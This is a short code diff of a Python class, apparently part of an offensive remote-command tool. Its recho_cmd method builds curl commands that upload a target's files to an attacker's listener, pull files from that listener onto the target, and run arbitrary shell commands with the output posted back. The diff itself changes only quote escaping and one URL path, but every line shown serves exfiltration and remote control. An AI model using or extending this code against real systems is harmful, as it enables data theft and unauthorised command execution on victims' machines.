@@ -35,10 +35,10 @@ class SendRequest:
 
     def recho_cmd(self, cmd):
         if cmd[:8] == "download":
-            return f"curl -X POST -F \"file=@{cmd[9:]}\" http://{self.listenerIP}:{str(self.port)}/upload"
+            return f"curl -X POST -F \\\"file=@{cmd[9:]}\\\" http://{self.listenerIP}:{str(self.port)}/upload"
         elif cmd[:6] == "upload":
             payload = cmd[7:].split(' ')
-            return f"curl -o {payload[1]} http://{self.listenerIP}:{str(self.port)}/file/uploads/{payload[0]}"
+            return f"curl -o {payload[1]} http://{self.listenerIP}:{str(self.port)}/file/files/{payload[0]}"
         elif self.listenerMethod == "POST":
             return f"curl -d \\\"HOST={self.headers.get('Host')}&CMD={cmd}&ECHO=$({cmd})\\\" http://{self.listenerIP}:{str(self.port)}"
         elif self.listenerMethod == "GET":
